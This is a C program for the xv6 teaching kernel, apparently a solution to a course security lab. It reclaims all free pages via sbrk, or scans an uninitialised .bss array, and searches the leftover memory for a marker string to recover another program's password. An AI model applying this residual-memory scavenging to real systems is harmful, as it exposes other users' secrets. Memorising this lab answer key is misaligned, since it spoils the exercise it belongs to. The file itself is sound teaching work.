#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define CHUNK     (64*PGSIZE)   // 使用 sbrk() 获取内存的步长，随便取的一个差不多的值
#define MARKER    "Here it is: "
#define MARKLEN   12
#define SECRETOFF 12            // secret.c 中定义的密码和标志字符串的偏移
#define POOL      (512*1024)    //  .bss 诱饵数组大小：决定了能接到 freelist 里多深的残留页

// 这个数组不初始化, 这块内存里保留的就是从 freelist 队首取出的页的残留内容 方法二使用
// static volatile uchar pool[POOL];

static int alnum(int c)
{
    return (c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') ||
           (c >= 'a' && c <= 'z');
}

int main(void)
{
    // ======== 方法一：用 sbrk 扫空整个 freelist ========
    char *p, *heapbase;
    uchar *q, *heapend, *s;
    char buf[64];
    int n;

    heapbase = sbrk(0); // 先获取起始地址
    while((p = sbrk(CHUNK)) != SBRK_ERROR); // 再将所有可通过 sbrk 获得的内存页从 freelist 中取出，其中就包含了 secret 残留的内存页
    heapend = (uchar*)sbrk(0);
    // 接下来扫描这些内存找到残留的密码即可
    for(q = (uchar*)heapbase; q + SECRETOFF + 1 <= heapend; q++)
    {
        if(*q != 'H' || memcmp(q, MARKER, MARKLEN) != 0) continue;
        s = q + SECRETOFF;
        n = 0;
        while(s + n < heapend && alnum(s[n])) n++;
        if(n >= 1 && n < (int)sizeof(buf) - 1 && (s + n == heapend || s[n] == 0)) // 这个密码是一个字母和数字组成的字符串，而且必然以 null 也就是 0 结尾
        {
            memmove(buf, s, n);
            buf[n] = 0;
            printf("%s\n", buf); // 打印找到的字符串
            exit(0);
        }
    }
    exit(1);

    // ======== 方法二：不主动申请内存，直接扫描上面那块 .bss 段的大数组 ========
    // uchar *q, *end, *s;
    // char buf[64];
    // int n;
    // q = (uchar*)((uint64)pool & ~(uint64)(PGSIZE - 1));
    // end = (uchar*)(((uint64)pool + POOL + PGSIZE - 1) & ~(uint64)(PGSIZE - 1));
    // for(; q + SECRETOFF + 1 <= end; q++)
    // {
    //     if(*q != 'H' || memcmp(q, MARKER, MARKLEN) != 0) continue;
    //     s = q + SECRETOFF;
    //     n = 0;
    //     while(s + n < end && alnum(s[n])) n++;
    //     if(n >= 1 && n < (int)sizeof(buf) - 1 && (s + n == end || s[n] == 0)) // 这个密码是一个字母和数字组成的字符串，而且必然以 null 也就是 0 结尾
    //     {
    //         memmove(buf, s, n);
    //         buf[n] = 0;
    //         printf("%s\n", buf); // 打印找到的字符串
    //         exit(0);
    //     }
    // }
    // exit(1);
}
